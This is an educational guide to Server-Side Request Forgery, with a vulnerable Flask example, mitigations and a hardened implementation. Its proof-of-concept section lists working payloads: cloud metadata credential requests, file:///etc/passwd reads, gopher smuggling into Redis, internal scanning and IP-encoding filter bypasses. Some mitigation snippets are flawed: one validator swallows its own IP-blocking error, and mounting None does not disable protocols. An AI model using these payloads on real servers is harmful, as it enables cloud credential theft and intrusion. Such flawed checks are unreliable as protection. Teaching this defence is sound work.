# Server-Side Request Forgery (SSRF)

## Overview

Server-Side Request Forgery (SSRF) is a vulnerability that allows attackers to make the server perform HTTP requests to arbitrary destinations. Attackers can abuse this to access internal resources, scan internal networks, bypass firewalls, and interact with services that should not be publicly accessible.

**Severity**: High to Critical  
**OWASP Top 10**: A10:2021 - Server-Side Request Forgery  
**CWE**: CWE-918

## Technical Explanation

SSRF occurs when a web application fetches remote resources based on user-supplied URLs without proper validation. The server acts as a proxy, making requests on behalf of the attacker with the server's privileges and network access.

### Attack Types

1. **Basic SSRF**: Direct access to internal resources
2. **Blind SSRF**: No direct response, but can infer success through timing or side channels
3. **Semi-Blind SSRF**: Limited information leakage through error messages
4. **SSRF with authentication bypass**: Accessing authenticated internal services

### Common Targets

- Internal APIs and admin panels
- Cloud metadata services (AWS, Azure, GCP)
- Internal databases and services
- File systems via file:// protocol
- Internal network scanning

## Attack Scenario

Consider an application that fetches and displays website previews:

```python
# Vulnerable code
@app.route('/preview')
def preview():
    url = request.args.get('url')
    response = requests.get(url)  # No validation!
    return response.content
```

An attacker can exploit this to access internal resources:

```http
GET /preview?url=http://localhost:8080/admin HTTP/1.1
GET /preview?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /preview?url=file:///etc/passwd HTTP/1.1
```

## Proof of Concept

### 1. Accessing Cloud Metadata

```http
# AWS EC2 Metadata
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1

# Response contains IAM role name, then:
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name HTTP/1.1

# Returns AWS credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

```http
# Azure Metadata
GET /preview?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Header: Metadata: true

# Google Cloud Metadata
GET /preview?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Header: Metadata-Flavor: Google
```

### 2. Internal Network Scanning

```python
# Scan internal network
for i in range(1, 255):
    url = f"http://192.168.1.{i}:80"
    # Observe response time or error messages to identify live hosts
```

### 3. Accessing Internal Services

```http
# Access internal Redis
GET /preview?url=http://localhost:6379/ HTTP/1.1

# Access internal Elasticsearch
GET /preview?url=http://localhost:9200/_cluster/health HTTP/1.1

# Access internal admin panel
GET /preview?url=http://internal-admin.local/users HTTP/1.1
```

### 4. Protocol Smuggling

```http
# File protocol
GET /preview?url=file:///etc/passwd HTTP/1.1

# Dict protocol (if supported)
GET /preview?url=dict://localhost:11211/stats HTTP/1.1

# Gopher protocol (can send arbitrary TCP data)
GET /preview?url=gopher://localhost:6379/_SET%20key%20value HTTP/1.1
```

### 5. Bypassing Filters

```http
# URL encoding
GET /preview?url=http://127.0.0.1%2f@example.com/

# Decimal IP
GET /preview?url=http://2130706433/  # 127.0.0.1 in decimal

# Hexadecimal IP
GET /preview?url=http://0x7f000001/  # 127.0.0.1 in hex

# Octal IP
GET /preview?url=http://0177.0.0.1/

# DNS rebinding
GET /preview?url=http://ssrf.example.com/  # Resolves to internal IP

# IPv6
GET /preview?url=http://[::1]/  # localhost

# URL fragments
GET /preview?url=http://example.com@localhost/

# CRLF injection
GET /preview?url=http://example.com%0d%0aHost:%20localhost/
```

## Impact

- **Cloud Credential Theft**: Access to AWS/Azure/GCP credentials leading to full cloud compromise
- **Internal Network Access**: Bypassing firewalls to access internal services
- **Data Exfiltration**: Reading sensitive files and internal API responses
- **Port Scanning**: Mapping internal network infrastructure
- **Authentication Bypass**: Accessing services that trust internal requests
- **Remote Code Execution**: In some cases, exploiting internal services
- **Denial of Service**: Overwhelming internal services with requests

**Real-World Examples**:
- Capital One breach (2019): SSRF to access AWS metadata
- Shopify SSRF (2017): $25,000 bounty
- Uber SSRF (2016): Internal service access

## Mitigation

### 1. URL Validation and Allowlisting

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = ['example.com', 'api.example.com']
ALLOWED_SCHEMES = ['http', 'https']

def validate_url(url):
    """Validate URL against allowlist"""
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            raise ValueError("Invalid URL scheme")
        
        # Check domain
        if parsed.hostname not in ALLOWED_DOMAINS:
            raise ValueError("Domain not allowed")
        
        # Prevent IP addresses
        try:
            ipaddress.ip_address(parsed.hostname)
            raise ValueError("IP addresses not allowed")
        except ValueError:
            pass  # Not an IP, which is good
        
        return True
    except Exception as e:
        raise ValueError(f"Invalid URL: {str(e)}")

@app.route('/preview')
def preview():
    url = request.args.get('url')
    
    try:
        validate_url(url)
        response = requests.get(url, timeout=5)
        return response.content
    except ValueError as e:
        return str(e), 400
```

### 2. Network-Level Restrictions

```python
import socket
import ipaddress

def is_private_ip(hostname):
    """Check if hostname resolves to private IP"""
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Check if IP is private, loopback, or link-local
        return (ip_obj.is_private or 
                ip_obj.is_loopback or 
                ip_obj.is_link_local or
                ip_obj.is_reserved)
    except:
        return True  # Err on the side of caution

def safe_request(url):
    """Make request with IP validation"""
    parsed = urlparse(url)
    
    if is_private_ip(parsed.hostname):
        raise ValueError("Access to private IPs not allowed")
    
    # Additional check: resolve and validate before request
    ip = socket.gethostbyname(parsed.hostname)
    if is_private_ip(ip):
        raise ValueError("Domain resolves to private IP")
    
    return requests.get(url, timeout=5)
```

### 3. Use Dedicated Libraries

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class SSRFProtectedAdapter(HTTPAdapter):
    """Custom adapter that blocks private IPs"""
    
    def send(self, request, **kwargs):
        # Parse hostname
        hostname = urlparse(request.url).hostname
        
        # Resolve IP
        try:
            ip = socket.gethostbyname(hostname)
            ip_obj = ipaddress.ip_address(ip)
            
            # Block private IPs
            if (ip_obj.is_private or ip_obj.is_loopback or 
                ip_obj.is_link_local or ip_obj.is_reserved):
                raise ValueError("Access to private IPs blocked")
        except socket.gaierror:
            raise ValueError("Cannot resolve hostname")
        
        return super().send(request, **kwargs)

# Use protected session
session = requests.Session()
session.mount('http://', SSRFProtectedAdapter())
session.mount('https://', SSRFProtectedAdapter())

@app.route('/preview')
def preview():
    url = request.args.get('url')
    validate_url(url)
    
    try:
        response = session.get(url, timeout=5, allow_redirects=False)
        return response.content
    except Exception as e:
        return "Request failed", 400
```

### 4. Disable Unnecessary Protocols

```python
import requests
from requests.adapters import HTTPAdapter

# Only allow HTTP/HTTPS
session = requests.Session()
session.mount('file://', None)  # Disable file protocol
session.mount('ftp://', None)   # Disable FTP
session.mount('gopher://', None)  # Disable gopher

@app.route('/preview')
def preview():
    url = request.args.get('url')
    
    # Validate scheme
    if not url.startswith(('http://', 'https://')):
        return "Only HTTP/HTTPS allowed", 400
    
    response = session.get(url, timeout=5)
    return response.content
```

### 5. Implement Response Validation

```python
def validate_response(response):
    """Validate response to prevent data leakage"""
    # Check content type
    content_type = response.headers.get('Content-Type', '')
    if not content_type.startswith(('text/', 'image/', 'application/json')):
        raise ValueError("Invalid content type")
    
    # Check response size
    if len(response.content) > 10 * 1024 * 1024:  # 10MB limit
        raise ValueError("Response too large")
    
    # Check for sensitive patterns
    sensitive_patterns = [
        'BEGIN RSA PRIVATE KEY',
        'aws_access_key_id',
        'password',
        'secret'
    ]
    
    content_lower = response.text.lower()
    for pattern in sensitive_patterns:
        if pattern.lower() in content_lower:
            raise ValueError("Response contains sensitive data")
    
    return True
```


## Secure Code Example

```python
from flask import Flask, request, jsonify
from urllib.parse import urlparse
import requests
import socket
import ipaddress
from functools import lru_cache
import re

app = Flask(__name__)

# Configuration
ALLOWED_DOMAINS = ['example.com', 'cdn.example.com', 'api.example.com']
ALLOWED_SCHEMES = ['http', 'https']
MAX_RESPONSE_SIZE = 10 * 1024 * 1024  # 10MB
REQUEST_TIMEOUT = 5

class SSRFProtection:
    """Comprehensive SSRF protection"""
    
    @staticmethod
    def validate_url(url):
        """Validate URL format and components"""
        try:
            parsed = urlparse(url)
            
            # Validate scheme
            if parsed.scheme not in ALLOWED_SCHEMES:
                raise ValueError(f"Scheme {parsed.scheme} not allowed")
            
            # Validate hostname exists
            if not parsed.hostname:
                raise ValueError("No hostname provided")
            
            # Block IP addresses directly
            try:
                ipaddress.ip_address(parsed.hostname)
                raise ValueError("Direct IP addresses not allowed")
            except ValueError as e:
                if "not allowed" in str(e):
                    raise
                # Not an IP address, continue
            
            # Validate against allowlist
            if parsed.hostname not in ALLOWED_DOMAINS:
                raise ValueError(f"Domain {parsed.hostname} not in allowlist")
            
            # Block credentials in URL
            if parsed.username or parsed.password:
                raise ValueError("Credentials in URL not allowed")
            
            # Validate port (if specified)
            if parsed.port and parsed.port not in [80, 443]:
                raise ValueError("Only ports 80 and 443 allowed")
            
            return True
        except Exception as e:
            raise ValueError(f"URL validation failed: {str(e)}")
    
    @staticmethod
    @lru_cache(maxsize=1000)
    def resolve_and_validate_ip(hostname):
        """Resolve hostname and validate IP is not private"""
        try:
            # Resolve hostname
            ip_str = socket.gethostbyname(hostname)
            ip_obj = ipaddress.ip_address(ip_str)
            
            # Check if IP is private/internal
            if ip_obj.is_private:
                raise ValueError("Hostname resolves to private IP")
            if ip_obj.is_loopback:
                raise ValueError("Hostname resolves to loopback address")
            if ip_obj.is_link_local:
                raise ValueError("Hostname resolves to link-local address")
            if ip_obj.is_reserved:
                raise ValueError("Hostname resolves to reserved IP")
            if ip_obj.is_multicast:
                raise ValueError("Hostname resolves to multicast address")
            
            # Block cloud metadata IPs
            metadata_ips = [
                '169.254.169.254',  # AWS, Azure, GCP
                '169.254.170.2',    # AWS ECS
            ]
            if ip_str in metadata_ips:
                raise ValueError("Access to metadata service blocked")
            
            return ip_str
        except socket.gaierror:
            raise ValueError("Cannot resolve hostname")
    
    @staticmethod
    def validate_response(response):
        """Validate response content"""
        # Check content length
        content_length = int(response.headers.get('Content-Length', 0))
        if content_length > MAX_RESPONSE_SIZE:
            raise ValueError("Response too large")
        
        # Check actual content size
        if len(response.content) > MAX_RESPONSE_SIZE:
            raise ValueError("Response exceeds size limit")
        
        # Validate content type
        content_type = response.headers.get('Content-Type', '').lower()
        allowed_types = ['text/', 'image/', 'application/json', 'application/xml']
        if not any(content_type.startswith(t) for t in allowed_types):
            raise ValueError("Invalid content type")
        
        return True

# Create protected session
def create_protected_session():
    """Create requests session with security configurations"""
    session = requests.Session()
    
    # Disable redirects to prevent redirect-based bypasses
    session.max_redirects = 0
    
    # Set user agent
    session.headers.update({
        'User-Agent': 'SecureApp/1.0'
    })
    
    return session

@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    """Securely fetch external URL"""
    try:
        # Get URL from request
        data = request.get_json()
        url = data.get('url')
        
        if not url:
            return jsonify({"error": "URL required"}), 400
        
        # Validate URL format
        SSRFProtection.validate_url(url)
        
        # Resolve and validate IP
        parsed = urlparse(url)
        SSRFProtection.resolve_and_validate_ip(parsed.hostname)
        
        # Make request with protections
        session = create_protected_session()
        response = session.get(
            url,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,
            stream=True  # Stream to check size before loading
        )
        
        # Validate response
        SSRFProtection.validate_response(response)
        
        # Return safe response
        return jsonify({
            "success": True,
            "content_type": response.headers.get('Content-Type'),
            "content": response.text[:1000],  # Limit returned content
            "status_code": response.status_code
        })
        
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except requests.exceptions.Timeout:
        return jsonify({"error": "Request timeout"}), 408
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Request failed"}), 500
    except Exception as e:
        app.logger.error(f"Unexpected error: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/api/preview', methods=['GET'])
def preview_url():
    """Preview URL with strict validation"""
    url = request.args.get('url')
    
    if not url:
        return jsonify({"error": "URL parameter required"}), 400
    
    try:
        # Validate URL
        SSRFProtection.validate_url(url)
        
        # Resolve and validate
        parsed = urlparse(url)
        ip = SSRFProtection.resolve_and_validate_ip(parsed.hostname)
        
        # Make request
        session = create_protected_session()
        response = session.get(
            url,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False
        )
        
        # Validate response
        SSRFProtection.validate_response(response)
        
        # Extract preview data
        preview = {
            "url": url,
            "title": extract_title(response.text),
            "description": extract_description(response.text),
            "status": response.status_code
        }
        
        return jsonify(preview)
        
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        return jsonify({"error": "Failed to fetch preview"}), 500

def extract_title(html):
    """Safely extract title from HTML"""
    match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
    return match.group(1)[:100] if match else "No title"

def extract_description(html):
    """Safely extract description from HTML"""
    match = re.search(r'<meta name="description" content="(.*?)"', html, re.IGNORECASE)
    return match.group(1)[:200] if match else "No description"

if __name__ == '__main__':
    app.run()
```

## Security Takeaways

1. **Allowlist domains**: Only allow requests to explicitly approved domains
2. **Validate resolved IPs**: Check that hostnames don't resolve to private IPs
3. **Block private IP ranges**: Prevent access to 127.0.0.1, 192.168.x.x, 10.x.x.x, 169.254.169.254
4. **Disable unnecessary protocols**: Only allow HTTP/HTTPS, block file://, gopher://, dict://
5. **Prevent DNS rebinding**: Validate IP after DNS resolution
6. **Disable redirects**: Prevent redirect-based SSRF bypasses
7. **Implement timeouts**: Prevent resource exhaustion
8. **Validate responses**: Check content type and size before processing
9. **Network segmentation**: Isolate services that make external requests
10. **Monitor and log**: Track all outbound requests for suspicious patterns

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [AWS SSRF Protection](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)

